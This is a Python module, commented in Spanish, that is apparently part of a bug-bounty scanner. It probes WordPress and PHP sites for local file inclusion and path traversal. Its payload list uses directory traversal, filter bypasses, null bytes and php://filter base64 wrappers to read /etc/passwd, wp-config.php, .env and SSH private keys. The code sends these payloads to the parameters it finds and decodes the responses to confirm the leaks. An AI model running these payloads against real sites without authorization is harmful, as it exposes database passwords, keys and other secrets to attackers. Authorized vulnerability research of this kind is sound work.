"""PATH-BAIT: bateria dedicada de LFI / path traversal (PAGA en Patchstack).

Mas profunda que la version dentro de STEALTH-BAIT:
  - wrappers: traversal directo, dobles puntos, barras invertidas
    (Windows), null byte, php://filter (base64) para wp-config
  - firmas: /etc/passwd, wp-config.php, .env, boot.ini, id_rsa
  - objetivos: params con nombre de archivo/ruta/plantilla Y ademas
    cualquier objetivo de alto valor (score >= 8) con sondas genericas
  - 100% lectura: archivos de SISTEMA como prueba, cero ejecucion
"""

import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

NAMES = re.compile(
    r"(file|path|page|template|tpl|lang|dir|view|include|load|download|"
    r"doc|filepath|source|resource|folder|document|entry|import)", re.I)

PAYLOADS = [
    ("../../../../etc/passwd", r"root:[x*!]:0:0:", "passwd (Linux)"),
    ("....//....//....//....//etc/passwd", r"root:[x*!]:0:0:", "passwd (bypass de filtro)"),
    ("..\\..\\..\\..\\windows\\win.ini", r"\[boot loader\]", "win.ini (Windows)"),
    ("../../../../etc/passwd%00.png", r"root:[x*!]:0:0:", "passwd (null byte)"),
    ("php://filter/convert.base64-encode/resource=wp-config.php",
     r"DB_PASSWORD", "wp-config.php (via php://filter)"),
    ("php://filter/convert.base64-encode/resource=.env",
     r"(APP_KEY|MAIL_|DB_)", ".env (via php::filter)"),
    ("../../../../etc/ssh/id_rsa", r"-----BEGIN", "id_rsa (claves SSH)"),
]

# sonda generica para params de alto valor sin nombre tipico
GENERIC_PROBE = "../../../../etc/passwd"


def _set_qs(url: str, extra: Dict[str, str]) -> str:
    p = urlparse(url)
    qs = dict(parse_qsl(p.query))
    qs.update(extra)
    return urlunparse(p._replace(query=urlencode(qs)))


class PathBait:
    def __init__(self, session, emit, delay: float = 0.0):
        self.session = session
        self.emit = emit or (lambda m: None)

    def _get(self, url: str):
        try:
            return self.session.get(url, timeout=12)
        except Exception:
            return None

    def _try(self, url: str, param: str, payload: str,
             sig: str, what: str) -> Optional[Dict[str, Any]]:
        r = self._get(_set_qs(url, {param: payload}))
        if r is None:
            return None
        body = r.text or ""
        import base64
        m = re.search(sig, body)
        if not m and "base64" in payload:      # php://filter: decodificar
            b64 = re.search(r"[A-Za-z0-9+/=]{80,}", body)
            if b64:
                try:
                    body = base64.b64decode(b64.group(0)).decode("utf-8",
                                                                 "ignore")
                    m = re.search(sig, body)
                except Exception:
                    m = None
        if m:
            return {
                "type": "LFI (path traversal)", "severity": "critica",
                "target": _set_qs(url, {param: payload}), "param": param,
                "evidence": f"lectura de {what} confirmada por firma "
                            f"(payload inerte, solo lectura)",
                "verdict": f"confirmado: {what}",
            }
        return None

    def run(self, url: str, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
        self.emit("[path] === PATH-BAIT: traversal y wrappers ===")
        findings: List[Dict[str, Any]] = []
        targets = spider_out.get("param_targets", [])
        named = [t for t in targets if NAMES.search(t.get("param", ""))]
        high = [t for t in targets
                if t.get("score", 0) >= 8 and t not in named][:4]
        if named:
            self.emit(f"[path] {len(named)} objetivo(s) con nombre de "
                      "archivo/ruta + sondas genericas en alto valor")
        for t in named:
            for payload, sig, what in PAYLOADS:
                f = self._try(t["url"], t["param"], payload, sig, what)
                if f:
                    findings.append(f)
                    self.emit(f"[path] 💥 LFI: {t['param']} en "
                              f"{urlparse(t['url']).path} lee {what}")
                    break
        for t in high:                        # params valiosos sin nombre tipico
            f = self._try(t["url"], t["param"], GENERIC_PROBE,
                          r"root:[x*!]:0:0:", "passwd (sonda generica)")
            if f:
                findings.append(f)
                self.emit(f"[path] 💥 LFI generico: {t['param']} en "
                          f"{urlparse(t['url']).path}")
        n = len(findings)
        self.emit(f"[path] === PATH-BAIT: {n} LFI(s) ===")
        return findings
